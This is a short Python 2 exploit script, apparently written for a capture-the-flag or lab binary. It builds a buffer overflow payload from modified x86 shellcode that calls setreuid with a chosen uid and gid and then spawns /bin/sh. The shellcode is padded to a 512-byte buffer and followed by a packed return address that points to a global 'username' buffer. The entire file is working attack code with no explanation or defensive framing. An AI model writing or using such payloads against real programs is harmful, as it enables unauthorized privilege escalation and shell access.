import struct

username = 0x0804a040
BUF_SIZE = 512

# http://shell-storm.org/shellcode/files/shellcode-250.php
#"\x6a\x46"			// push   $0x46
#"\x58"			// pop    %eax
#"\x31\xdb"			// xor	  %ebx, %ebx
#"\x31\xc9"			// xor	  %ecx, %ecx
#"\xcd\x80"			// int    $0x80
#
#"\x31\xd2"			// xor    %edx, %edx
#"\x6a\x0b"			// push   $0xb
#"\x58"			// pop    %eax
#"\x52"			// push   %edx
#"\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
#"\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
#"\x89\xe3"			// mov    %esp, %ebx
#"\x52"			// push   %edx
#"\x53"			// push   %ebx
#"\x89\xe1"			// mov    %esp, %ecx
#"\xcd\x80";			// int    $0x80

# modified shellcode with right uid, gid and with bx, cx registers to fit 0x457 2-byte UID
shellcode = "\x6A\x46\x58\x66\xBB\xB7\x04\x66\xB9\x53\x04\xCD\x80\x31\xD2\x6A\x0B\x58\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80"

payload = shellcode
payload += "A" *(BUF_SIZE - len(shellcode))
payload += struct.pack("I", username)

print payload
